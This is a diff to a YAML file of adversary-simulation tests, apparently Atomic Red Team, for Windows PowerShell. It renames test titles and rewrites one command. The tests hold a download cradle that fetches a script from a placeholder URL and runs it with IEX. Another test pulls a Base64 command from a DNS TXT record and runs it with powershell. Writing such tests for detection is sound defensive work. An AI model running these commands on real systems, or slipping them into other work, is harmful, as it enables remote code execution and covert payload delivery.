@@ -481,7 +481,7 @@ atomic_tests:
     command: |
       #{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}
     name: powershell
-- name: 'Possehl: Powershell remote script execution'
+- name: 'Custom: Powershell remote script execution'
   description: Download base64 encoded script and execute it. based on Test 1 (Mimikatz) but without malicious payload
   supported_platforms:
     - windows
@@ -494,7 +494,7 @@ atomic_tests:
     command: IEX (New-Object Net.WebClient).DownloadString('#{pwshurl}')
     name: powershell
     elevation_required: false
-- name: Retrieve and Execute Base64 PowerShell Payload via DNS TXT Record (Possehl)
+- name: 'Custom: Retrieve and Execute Base64 PowerShell Payload via DNS TXT Record'
   auto_generated_guid: 5d0d9dc2-cc6e-4b43-aaba-1dbb24edacda
   description: |
     Simulates retrieving a Base64-encoded PowerShell command from a DNS TXT record and executing it.
@@ -518,6 +518,5 @@ atomic_tests:
     command: |
       $domain = "#{dns_domain}"
       $dns = "#{dns_server}"
-      $encoded = (nslookup -q=txt $domain $dns)[-1]
-      $cmd = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
-      powershell -Command $cmd
+      $txt = (nslookup -q=txt $domain $dns)[5] -replace '.*"(.+?)".*', '$1'
+      powershell -Command ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($txt)))
